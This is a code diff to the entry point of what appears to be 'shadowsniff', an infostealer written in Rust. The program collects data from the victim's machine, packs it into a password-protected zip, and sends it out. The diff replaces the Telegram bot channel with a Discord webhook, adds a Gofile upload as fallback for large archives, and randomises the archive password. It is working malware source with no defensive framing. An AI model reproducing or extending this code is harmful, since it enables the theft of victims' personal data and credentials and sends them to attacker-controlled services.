@@ -7,21 +7,26 @@
 extern crate alloc;
 
 use alloc::format;
-use alloc::string::ToString;
+use alloc::string::String;
 use alloc::sync::Arc;
+use alloc::vec::Vec;
 use collector::atomic::AtomicCollector;
 use collector::DisplayCollector;
 use filesystem::path::Path;
 use filesystem::virtualfs::VirtualFileSystem;
 use filesystem::FileSystem;
 use ipinfo::init_ip_info;
+use rand_chacha::ChaCha20Rng;
+use rand_core::RngCore;
+use sender::discord_webhook::DiscordWebhook;
 use sender::gofile::Gofile;
-use sender::telegram_bot::TelegramBot;
+use sender::size_fallback::SizeFallbackLogFile;
 use sender::LogSender;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
-use zip::ZipArchive;
+use utils::random::ChaCha20RngExt;
+use zip::{ZipArchive, ZipCompression};
 
 mod panic;
 
@@ -50,19 +55,32 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
 
     log_debug!("{displayed_collector}");
 
-    let password = "shadowsniff-ouasdjkasjdbvtput".to_string();
+    let password: String = {
+        let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
+        let mut rng = ChaCha20Rng::from_nano_time();
+
+        (0..10)
+            .map(|_| {
+                let idx = (rng.next_u32() as usize) % charset.len();
+                charset[idx]
+            })
+            .collect()
+    };
+
     let zip = ZipArchive::default()
         .add_folder_content(&fs, out)
         .password(&password)
+        .compression(ZipCompression::NONE)
         .comment(displayed_collector)
         .create();
 
     // let out = Path::new("output.zip");
     // let _ = StorageFileSystem.write_file(&out, &zip);
 
-    let telegram = TelegramBot::new(Arc::from(env!("TELEGRAM_CHAT_ID")), Arc::from(env!("TELEGRAM_BOT_TOKEN")));
+    let discord = DiscordWebhook::new(Arc::from(env!("DISCORD_WEBHOOK")));
+    let gofile = Gofile::new(discord.clone());
 
-    Gofile::new(telegram)
+    SizeFallbackLogFile::new(discord, gofile)
         .send(zip.into(), Some(password), &collector)
         .unwrap();
 
